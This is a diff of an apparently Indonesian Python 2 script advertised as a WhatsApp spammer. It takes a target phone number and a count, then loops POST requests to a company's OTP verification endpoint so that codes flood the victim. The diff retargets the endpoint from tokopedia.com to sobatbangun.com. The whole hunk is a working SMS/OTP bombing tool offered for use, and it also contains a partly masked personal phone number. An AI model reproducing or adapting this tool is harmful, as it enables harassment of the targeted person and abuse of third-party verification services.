@@ -12,14 +12,14 @@ try:
  print """%s
  
  %sAuthor   : Ryzz%s
- %sWhatsApp : github.com/Ryzz03%s
+ %sWhatsApp : +6282192959xxx%s
  %s============================%s
- %sSpam Whatsapp AutoNangis"""%(G0,W0,G0,W0,G0,W0,G0,G0)
- gg = raw_input("%s[%s?%s] %sIsi nomornya targer kak (ex:0881xx) : "%(W0,C0,W0,W0))
+ %sSpam Whatsapp AutoNangis"""%(G0,RO,G0,RO,G0,W0,G0,G0)
+ gg = raw_input("%s[%s?%s] %sIsi nomornya target kak (ex:0821xxx) : "%(W0,C0,W0,W0))
  gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa? : "%(W0,C0,W0,W0)))
  c = 1
  for x in range(gi):
-  h = json.loads(r.post("https://www.tokopedia.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
+  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
   if h["status"] == 'success':
    print "%s[%s%s%s] %sBERHASIL %sdikirim ke %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
    c += 1
